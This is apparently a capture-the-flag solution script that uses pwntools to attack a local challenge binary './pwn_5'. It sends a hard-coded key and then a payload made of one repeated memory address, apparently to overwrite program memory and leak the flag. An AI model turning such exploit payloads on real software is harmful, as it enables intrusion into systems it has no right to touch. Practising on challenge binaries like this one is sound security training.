from pwn import *
context.log_level = 'debug'

filename = './pwn_5'
r = process(filename)

r.sendafter("please enter the key:","852706")

payload = p64(0x6020d0)*0x60
# pause()

r.sendafter("welcome!\n",payload)
r.recvuntil(": ")
flag = r.recvuntil('}')
print flag
# print r.recv()

